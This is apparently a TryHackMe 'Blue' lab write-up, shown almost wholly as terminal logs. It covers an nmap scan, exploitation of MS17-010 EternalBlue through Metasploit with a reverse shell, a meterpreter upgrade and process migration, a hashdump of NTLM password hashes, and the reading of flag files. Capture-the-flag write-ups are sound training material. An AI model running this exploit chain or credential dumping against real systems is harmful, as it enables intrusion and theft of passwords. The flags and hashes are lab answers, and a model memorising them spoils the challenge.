# Task 1: Recon

```Bash
root@ip-10-10-95-15:~# nmap -sC -sV 10.10.84.232

Starting Nmap 7.60 ( https://nmap.org ) at 2023-07-19 00:29 BST
Nmap scan report for ip-10-10-84-232.eu-west-1.compute.internal (10.10.84.232)
Host is up (0.00036s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2023-07-17T23:29:02
|_Not valid after:  2024-01-16T23:29:02
|_ssl-date: 2023-07-18T23:31:49+00:00; +1s from scanner time.
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
49159/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 02:AB:F6:F6:A9:2F (Unknown)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:ab:f6:f6:a9:2f (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-07-18T18:31:49-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-07-19 00:31:49
|_  start_date: 2023-07-19 00:29:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.09 seconds
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Blue/Assets/Blue%20pt1.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Blue/Assets/Blue%20pt2.png)

# Task 2: Gain Access


```Bash
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```
```Bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
```
```Bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs
                                             .metasploit.com/docs/using-metasploi
                                             t/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use
                                              for authentication. Only affects Wi
                                             ndows Server 2008 R2, Windows 7, Win
                                             dows Embedded Standard 7 target mach
                                             ines.
   SMBPass                         no        (Optional) The password for the spec
                                             ified username
   SMBUser                         no        (Optional) The username to authentic
                                             ate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches
                                              exploit Target. Only affects Window
                                             s Server 2008 R2, Windows 7, Windows
                                              Embedded Standard 7 target machines
                                             .
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit T
                                             arget. Only affects Windows Server 2
                                             008 R2, Windows 7, Windows Embedded
                                             Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread
                                        , process, none)
   LHOST     10.10.95.15      yes       The listen address (an interface may be s
                                        pecified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
```

```Bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.84.232
RHOSTS => 10.10.84.232
```

```Bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
```

```Bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.10.95.15:4444 
[*] 10.10.84.232:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.84.232:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.84.232:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.84.232:445 - The target is vulnerable.
[*] 10.10.84.232:445 - Connecting to target for exploitation.
[+] 10.10.84.232:445 - Connection established for exploitation.
[+] 10.10.84.232:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.84.232:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.84.232:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.84.232:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.84.232:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.84.232:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.84.232:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.84.232:445 - Sending all but last fragment of exploit packet
[*] 10.10.84.232:445 - Starting non-paged pool grooming
[+] 10.10.84.232:445 - Sending SMBv2 buffers
[+] 10.10.84.232:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.84.232:445 - Sending final SMBv2 buffers.
[*] 10.10.84.232:445 - Sending last fragment of exploit packet!
[*] 10.10.84.232:445 - Receiving response from exploit packet
[+] 10.10.84.232:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.84.232:445 - Sending egg to corrupted connection.
[*] 10.10.84.232:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.84.232
[+] 10.10.84.232:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.84.232:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.84.232:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Command shell session 1 opened (10.10.95.15:4444 -> 10.10.84.232:49204) at 2023-07-19 00:54:35 +0100


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>
```

```Bash
C:\Windows\system32>^Z
Background session 1? [y/N]  y
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

```Bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter
```

```Bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter 
msf6 post(multi/manage/shell_to_meterpreter) >
```

```Bash
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive
                                       the connection
   LHOST                     no        IP of host that will receive the connectio
                                       n from the payload (Will try to auto detec
                                       t).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.
```

```Bash
msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type               Information               Connection
  --  ----  ----               -----------               ----------
  1         shell x64/windows  Shell Banner: Microsoft   10.10.95.15:4444 -> 10.1
                               Windows [Version 6.1.760  0.84.232:49204 (10.10.84
                               1] -----                  .232)
```

```Bash
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
```

```Bash
msf6 post(multi/manage/shell_to_meterpreter) > exploit

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.95.15:4433 
[*] Post module execution completed
[*] Sending stage (200774 bytes) to 10.10.84.232
[*] Meterpreter session 2 opened (10.10.95.15:4433 -> 10.10.84.232:49217) at 2023-07-19 01:05:35 +0100
[*] Stopping exploit/multi/handler
```

```Bash
msf6 post(multi/manage/shell_to_meterpreter) > sessions 1
[*] Starting interaction with 1...


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>
```

```PowerShell
C:\Windows\system32>whoami
whoami
nt authority\system
```

```Bash
meterpreter > getsystem
[-] Already running as SYSTEM
```

```Bash
msf6 post(multi/manage/shell_to_meterpreter) > sessions 2
[*] Starting interaction with 2...
```

```Bash
meterpreter > ps

Process List
============

 PID   PPID  Name          Arch  Session  User                Path
 ---   ----  ----          ----  -------  ----                ----
 0     0     [System Proc
             ess]
 4     0     System        x64   0
 416   4     smss.exe      x64   0        NT AUTHORITY\SYSTE  \SystemRoot\System3
                                          M                   2\smss.exe
 460   668   LogonUI.exe   x64   1        NT AUTHORITY\SYSTE  C:\Windows\system32
                                          M                   \LogonUI.exe
 480   716   svchost.exe   x64   0        NT AUTHORITY\SYSTE
                                          M
 488   716   svchost.exe   x64   0        NT AUTHORITY\SYSTE
                                          M
 568   560   csrss.exe     x64   0        NT AUTHORITY\SYSTE  C:\Windows\system32
                                          M                   \csrss.exe
 616   560   wininit.exe   x64   0        NT AUTHORITY\SYSTE  C:\Windows\system32
                                          M                   \wininit.exe
 628   608   csrss.exe     x64   1        NT AUTHORITY\SYSTE  C:\Windows\system32
                                          M                   \csrss.exe
 668   608   winlogon.exe  x64   1        NT AUTHORITY\SYSTE  C:\Windows\system32
                                          M                   \winlogon.exe
 716   616   services.exe  x64   0        NT AUTHORITY\SYSTE  C:\Windows\system32
                                          M                   \services.exe
 724   616   lsass.exe     x64   0        NT AUTHORITY\SYSTE  C:\Windows\system32
                                          M                   \lsass.exe
 732   616   lsm.exe       x64   0        NT AUTHORITY\SYSTE  C:\Windows\system32
                                          M                   \lsm.exe
 804   568   conhost.exe   x64   0        NT AUTHORITY\SYSTE  C:\Windows\system32
                                          M                   \conhost.exe
 844   716   svchost.exe   x64   0        NT AUTHORITY\SYSTE
                                          M
 912   716   svchost.exe   x64   0        NT AUTHORITY\NETWO
                                          RK SERVICE
 960   716   svchost.exe   x64   0        NT AUTHORITY\LOCAL
                                           SERVICE
 1124  716   svchost.exe   x64   0        NT AUTHORITY\LOCAL
                                           SERVICE
 1224  716   svchost.exe   x64   0        NT AUTHORITY\NETWO
                                          RK SERVICE
 1292  1356  cmd.exe       x64   0        NT AUTHORITY\SYSTE  C:\Windows\System32
                                          M                   \cmd.exe
 1356  716   spoolsv.exe   x64   0        NT AUTHORITY\SYSTE  C:\Windows\System32
                                          M                   \spoolsv.exe
 1392  716   svchost.exe   x64   0        NT AUTHORITY\LOCAL
                                           SERVICE
 1452  716   amazon-ssm-a  x64   0        NT AUTHORITY\SYSTE  C:\Program Files\Am
             gent.exe                     M                   azon\SSM\amazon-ssm
                                                              -agent.exe
 1528  716   LiteAgent.ex  x64   0        NT AUTHORITY\SYSTE  C:\Program Files\Am
             e                            M                   azon\XenTools\LiteA
                                                              gent.exe
 1672  716   Ec2Config.ex  x64   0        NT AUTHORITY\SYSTE  C:\Program Files\Am
             e                            M                   azon\Ec2ConfigServi
                                                              ce\Ec2Config.exe
 1756  2616  powershell.e  x64   0        NT AUTHORITY\SYSTE  C:\Windows\System32
             xe                           M                   \WindowsPowerShell\
                                                              v1.0\powershell.exe
 1984  716   svchost.exe   x64   0        NT AUTHORITY\NETWO
                                          RK SERVICE
 2092  716   TrustedInsta  x64   0        NT AUTHORITY\SYSTE
             ller.exe                     M
 2096  844   WmiPrvSE.exe
 2260  716   svchost.exe   x64   0        NT AUTHORITY\LOCAL
                                           SERVICE
 2492  568   conhost.exe   x64   0        NT AUTHORITY\SYSTE  C:\Windows\system32
                                          M                   \conhost.exe
 2568  716   sppsvc.exe    x64   0        NT AUTHORITY\NETWO
                                          RK SERVICE
 2580  716   svchost.exe   x64   0        NT AUTHORITY\SYSTE
                                          M
 2620  716   vds.exe       x64   0        NT AUTHORITY\SYSTE
                                          M
 2780  716   SearchIndexe  x64   0        NT AUTHORITY\SYSTE
             r.exe                        M
```

```Bash
meterpreter > migrate 1756
[*] Migrating from 1356 to 1756...
[*] Migration completed successfully.
```

# Task 3: Cracking


```Bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Blue/Assets/Blue%20pt3.png)

# Task 4: Find Flags!


```PowerShell
C:\Windows\system32>dir /s C:\*flag1*
dir /s C:\*flag1*
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\

03/17/2019  02:27 PM                24 flag1.txt
               1 File(s)             24 bytes

 Directory of C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent

03/17/2019  02:26 PM               482 flag1.lnk
               1 File(s)            482 bytes

     Total Files Listed:
               2 File(s)            506 bytes
               0 Dir(s)  21,103,321,088 bytes free
```

```PowerShell
C:\Windows\system32>type C:\flag1.txt
type C:\flag1.txt
flag{access_the_machine}
```

```PowerShell
C:\Windows\system32>dir /s C:\*flag2*
dir /s C:\*flag2*
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent

03/17/2019  02:30 PM               848 flag2.lnk
               1 File(s)            848 bytes

 Directory of C:\Windows\System32\config

03/17/2019  02:32 PM                34 flag2.txt
               1 File(s)             34 bytes

     Total Files Listed:
               2 File(s)            882 bytes
               0 Dir(s)  21,103,026,176 bytes free
```

```PowerShell
C:\Windows\system32>type C:\Windows\System32\config\flag2.txt
type C:\Windows\System32\config\flag2.txt
flag{sam_database_elevated_access}
```

```PowerShell
C:\Windows\system32>dir /s C:\*flag3*
dir /s C:\*flag3*
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent

03/17/2019  02:32 PM             2,344 flag3.lnk
               1 File(s)          2,344 bytes

 Directory of C:\Users\Jon\Documents

03/17/2019  02:26 PM                37 flag3.txt
               1 File(s)             37 bytes

     Total Files Listed:
               2 File(s)          2,381 bytes
               0 Dir(s)  21,099,413,504 bytes free
```

```PowerShell
C:\Windows\system32>type C:\Users\Jon\Documents\flag3.txt
type C:\Users\Jon\Documents\flag3.txt
flag{admin_documents_can_be_valuable}
```
